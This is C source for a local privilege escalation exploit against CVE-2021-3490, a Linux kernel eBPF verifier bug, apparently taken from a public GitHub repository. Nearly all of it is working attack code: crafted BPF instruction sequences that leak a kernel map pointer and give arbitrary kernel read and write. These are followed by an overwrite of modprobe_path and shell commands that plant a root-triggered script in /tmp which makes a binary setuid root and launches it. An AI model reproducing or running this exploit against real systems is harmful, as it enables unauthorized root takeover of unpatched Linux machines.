// https://github.com/pivik271/CVE-2021-3490
// gcc -o pwn pwn.c && gcc -o exploit exploit.c

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <linux/bpf.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/socket.h>

#include "bpf_insn.h"

#define MODPROBE_PATH 0x36c6f20

char bpf_log[0x10000] = {};

void error(char *msg) {
	perror(msg);
	exit(-1);
}

int bpf(int cmd, union bpf_attr *attr) {
	return syscall(__NR_bpf, cmd, attr, sizeof(*attr));
}

int bpf_map_create(union bpf_attr *attr) {
	return bpf(BPF_MAP_CREATE, attr);
}

int map_update(int map_fd, int key, void *pval) {
	union bpf_attr attr = {
		.map_fd = map_fd,
		.key = (uint64_t)&key,
		.value = (uint64_t)pval,
		.flags = BPF_ANY
	};

	int res = bpf(BPF_MAP_UPDATE_ELEM, &attr);

	if(res == -1) {
		error("bpf(BPF_MAP_UPDATE_ELEM)");
	}

	return res;
}

int map_lookup(int map_fd, int key, void *pval) {
	union bpf_attr attr = {
		.map_fd = map_fd,
		.key = (uint64_t)&key,
		.value = (uint64_t)pval,
		.flags = BPF_ANY
	};

	return bpf(BPF_MAP_LOOKUP_ELEM, &attr);
}

int load_bpf_prog(struct bpf_insn *insns, uint32_t insn_cnt) {
	union bpf_attr attr = {
		.prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
		.insn_cnt = insn_cnt,
		.insns = (uint64_t)insns,
		.license = (uint64_t)"GPL",
		.log_level = 2,
		.log_size = sizeof(bpf_log),
		.log_buf = (uint64_t)bpf_log
	};
	return bpf(BPF_PROG_LOAD, &attr);
}

uint64_t aar64(int map_fd, uint64_t addr) {
	memset(bpf_log, '\x00', sizeof(bpf_log));
	int socks[2] = {};
	int fd = 0;
	uint64_t val = 0;
	map_update(map_fd, 0, &val);

	struct bpf_insn insns[] = {
	    BPF_MOV64_REG(BPF_REG_9, BPF_REG_1),

		BPF_MOV64_IMM(BPF_REG_6, 1),											// r6: 0x1
		BPF_ALU64_IMM(BPF_LSH, BPF_REG_6, 32),									// r6: 0x100000000
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_6, 2),									// r6: 0x100000002

		BPF_MOV64_IMM(BPF_REG_0, 0),
		BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -8),							// *(u64 *)(r10 - 8) = r0

		BPF_LD_MAP_FD(BPF_REG_1, map_fd),										// reg1 = map_fd
		BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),									// r2 = r10
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),									// r2 -= 8
		BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),	// map_lookup_elem(map_fd, &key)

		BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
		BPF_EXIT_INSN(),

		// r7: var_off = {mask = 0xffffffffffffffff; value = 0x0}
		BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0),
		BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_0, 0),

		BPF_MOV64_IMM(BPF_REG_2, 0xffffffff),									// r2 = 0xffffffff
		BPF_ALU64_IMM(BPF_LSH, BPF_REG_2, 32),									// r2 = 0xffffffff00000000

		// r7: var_off = {mask = 0xffffffff00000000; value = 0x0}
		BPF_ALU64_REG(BPF_AND, BPF_REG_7, BPF_REG_2),
		// r7: var_off = {mask = 0xffffffff00000000; value = 0x1}
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 1),
		// Trigger the bug
		BPF_ALU64_REG(BPF_AND, BPF_REG_7, BPF_REG_6),

		// r7: u32_min_value = 2, u32_max_value=1
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 1),
		// r8: u32_min_value = 0, u32_max_value=1
		BPF_JMP32_IMM(BPF_JLE, BPF_REG_8, 1, 2),
		BPF_MOV64_IMM(BPF_REG_0, 0),
		BPF_EXIT_INSN(),

		BPF_ALU64_REG(BPF_ADD, BPF_REG_7, BPF_REG_8),
		BPF_MOV32_REG(BPF_REG_7, BPF_REG_7),
		// r7: 2 & 1 = 0 (runtime value: 1)
		BPF_ALU64_IMM(BPF_AND, BPF_REG_7, 1),

		BPF_ALU64_IMM(BPF_MUL, BPF_REG_7, 0x10 - 1),
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 1),

		// move a valid pointer into (r10 - 8)
		BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0x8),

		BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),									// skb
		BPF_MOV64_IMM(BPF_REG_2, 0),											// offset
		BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),									// to
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -0x10),
		BPF_MOV64_REG(BPF_REG_4 , BPF_REG_7),									// len
		BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_skb_load_bytes),

		BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_10, -0x8),
		BPF_LDX_MEM(BPF_DW, BPF_REG_2, BPF_REG_1, 0),

		BPF_MOV64_IMM(BPF_REG_3, 0),
		BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_3, -0x8),

		BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_2, -0x10),

		BPF_LD_MAP_FD(BPF_REG_1, map_fd),
		BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),									// key
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -0x08),
		BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),									// value
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -0x10),
		BPF_MOV64_IMM(BPF_REG_4, 0),											// flag
		BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_update_elem),	// map_update_elem

		BPF_MOV64_IMM(BPF_REG_0, 200),
		BPF_EXIT_INSN(),
	};

	fd = load_bpf_prog(insns, sizeof(insns) / sizeof(insns[0]));

	if(fd < 0) {
		error("bpf");
	}

	if(socketpair(AF_UNIX, SOCK_DGRAM, 0, socks)) {
		error("socketpair");
	}

	if(setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &fd, sizeof(int))) {
		error("setsockopt");
	}

	char payload[0x10];
	*(unsigned long *)&payload[0] = 0x4141414141414141;
	*(unsigned long *)&payload[8] = addr;
	write(socks[1], payload, 0x10);

	map_lookup(map_fd, 0, &val);

	// printf("%s", bpf_log);

	return val;
}

void aaw64(int map_fd, uint64_t addr, uint64_t value) {
	memset(bpf_log, '\x00', sizeof(bpf_log));
	int socks[2] = {};
	int fd = 0;
	uint64_t val = 0;
	map_update(map_fd, 0, &val);

	struct bpf_insn insns[] = {
	    BPF_MOV64_REG(BPF_REG_9, BPF_REG_1),

		BPF_MOV64_IMM(BPF_REG_6, 1),											// r6: 0x1
		BPF_ALU64_IMM(BPF_LSH, BPF_REG_6, 32),									// r6: 0x100000000
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_6, 2),									// r6: 0x100000002

		BPF_MOV64_IMM(BPF_REG_0, 0),
		BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -8),							// *(u64 *)(r10 - 8) = r0

		BPF_LD_MAP_FD(BPF_REG_1, map_fd),										// reg1 = map_fd
		BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),									// r2 = r10
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),									// r2 -= 8
		BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),	// map_lookup_elem(map_fd, &key)

		BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
		BPF_EXIT_INSN(),

		// r7: var_off = {mask = 0xffffffffffffffff; value = 0x0}
		BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0),
		BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_0, 0),

		BPF_MOV64_IMM(BPF_REG_2, 0xffffffff),									// r2 = 0xffffffff
		BPF_ALU64_IMM(BPF_LSH, BPF_REG_2, 32),									// r2 = 0xffffffff00000000

		// r7: var_off = {mask = 0xffffffff00000000; value = 0x0}
		BPF_ALU64_REG(BPF_AND, BPF_REG_7, BPF_REG_2),
		// r7: var_off = {mask = 0xffffffff00000000; value = 0x1}
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 1),
		// Trigger the bug
		BPF_ALU64_REG(BPF_AND, BPF_REG_7, BPF_REG_6),

		// r7: u32_min_value = 2, u32_max_value=1
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 1),
		// r8: u32_min_value = 0, u32_max_value=1
		BPF_JMP32_IMM(BPF_JLE, BPF_REG_8, 1, 2),
		BPF_MOV64_IMM(BPF_REG_0, 0),
		BPF_EXIT_INSN(),

		BPF_ALU64_REG(BPF_ADD, BPF_REG_7, BPF_REG_8),
		BPF_MOV32_REG(BPF_REG_7, BPF_REG_7),
		// r7: 2 & 1 = 0 (runtime value: 1)
		BPF_ALU64_IMM(BPF_AND, BPF_REG_7, 1),

		BPF_ALU64_IMM(BPF_MUL, BPF_REG_7, 0x10 - 1),
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 1),

		// move a valid pointer into (r10 - 8)
		BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0x8),

		BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),									// skb
		BPF_MOV64_IMM(BPF_REG_2, 0),											// offset
		BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),									// to
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -0x10),
		BPF_MOV64_REG(BPF_REG_4 , BPF_REG_7),									// len
		BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_skb_load_bytes),

		BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_10, -0x8),
		BPF_MOV64_IMM(BPF_REG_2, value >> 32),
		BPF_ALU64_IMM(BPF_LSH, BPF_REG_2, 32),
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, value & 0xffffffff),
		BPF_STX_MEM(BPF_DW, BPF_REG_1, BPF_REG_2, 0),

		BPF_MOV64_IMM(BPF_REG_0, 200),
		BPF_EXIT_INSN(),
	};

	fd = load_bpf_prog(insns, sizeof(insns) / sizeof(insns[0]));

	if(fd < 0) {
		error("bpf");
	}

	if(socketpair(AF_UNIX, SOCK_DGRAM, 0, socks)) {
		error("socketpair");
	}

	if(setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &fd, sizeof(int))) {
		error("setsockopt");
	}

	char payload[0x10];
	*(unsigned long *)&payload[0] = 0x4141414141414141;
	*(unsigned long *)&payload[8] = addr;
	write(socks[1], payload, 0x10);

	// printf("%s", bpf_log);
}

uint64_t leak_map_ptr(int map_fd) {
	int socks[2] = {};
	int fd = 0;
	uint64_t val = 0;
	struct bpf_insn insns[] = {
	    BPF_MOV64_REG(BPF_REG_9, BPF_REG_1),

		BPF_MOV64_IMM(BPF_REG_6, 1),											// r6: 0x1
		BPF_ALU64_IMM(BPF_LSH, BPF_REG_6, 32),									// r6: 0x100000000
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_6, 2),									// r6: 0x100000002

		BPF_MOV64_IMM(BPF_REG_0, 0),
		BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -8),							// *(u64 *)(r10 - 8) = r0

		BPF_LD_MAP_FD(BPF_REG_1, map_fd),										// reg1 = map_fd
		BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),									// r2 = r10
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),									// r2 -= 8
		BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),	// map_lookup_elem(map_fd, &key)

		BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
		BPF_EXIT_INSN(),

		// r7: var_off = {mask = 0xffffffffffffffff; value = 0x0}
		BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0),

		BPF_MOV64_IMM(BPF_REG_2, 0xffffffff),									// r2 = 0xffffffff
		BPF_ALU64_IMM(BPF_LSH, BPF_REG_2, 32),									// r2 = 0xffffffff00000000

		// r7: var_off = {mask = 0xffffffff00000000; value = 0x0}
		BPF_ALU64_REG(BPF_AND, BPF_REG_7, BPF_REG_2),
		// r7: var_off = {mask = 0xffffffff00000000; value = 0x1}
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 1),
		// Trigger the bug
		BPF_ALU64_REG(BPF_AND, BPF_REG_7, BPF_REG_6),

		BPF_MOV32_REG(BPF_REG_7, BPF_REG_7),
		BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_7),

		// Leak BPF map address
		BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0x10),						// *(u64 *)(r10 - 0x10) = r0

		BPF_LD_MAP_FD(BPF_REG_1, map_fd),
		BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),									// key
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -0x08),
		BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),									// value
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -0x10),
		BPF_MOV64_IMM(BPF_REG_4, 0),											// flag
		BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_update_elem),	// map_update_elem

		BPF_MOV64_IMM(BPF_REG_0, 100),
		BPF_EXIT_INSN(),
	};

	fd = load_bpf_prog(insns, sizeof(insns) / sizeof(insns[0]));

	if(fd < 0) {
		error("bpf");
	}

	if(socketpair(AF_UNIX, SOCK_DGRAM, 0, socks)) {
		error("socketpair");
	}

	if(setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &fd, sizeof(int))) {
		error("setsockopt");
	}

	write(socks[1], "Hello", 5);
	map_lookup(map_fd, 0, &val);

	// printf("%s", bpf_log);

	return val;

}

int main() {
	int map_fd;
	uint64_t val = 0, map_ptr = 0, array_map_ops = 0, kernel_base = 0;

	union bpf_attr map_attr = {
		.map_type = BPF_MAP_TYPE_ARRAY,
		.key_size = 4,
		.value_size = 8,
		.max_entries = 1
	};

	map_fd = bpf_map_create(&map_attr);
	int res = map_update(map_fd, 0, &val);

	if(map_fd < 0) {
		error("bpf map");
	}

	map_ptr = leak_map_ptr(map_fd);
	printf("map pointer: 0x%lx\n", map_ptr);

	array_map_ops = aar64(map_fd, map_ptr - 0x110);
	printf("array map ops: 0x%lx\n", array_map_ops);

	kernel_base = aar64(map_fd, array_map_ops) - 0x2ea9b40;
	printf("kernel base: 0x%lx\n", kernel_base);

	aaw64(map_fd, kernel_base + MODPROBE_PATH, 0x0000782f706d742f);

	system("cp pwn /tmp/");
	system("echo '#!/bin/sh\nchown root:root /tmp/pwn\nchmod 4777 /tmp/pwn\n' > /tmp/x");
	system("chmod +x /tmp/x");
	system("echo -n '\xff\xff\xff\xff' > /tmp/dummy");
	system("chmod +x /tmp/dummy");
	system("/tmp/dummy");

	system("/tmp/pwn");
}
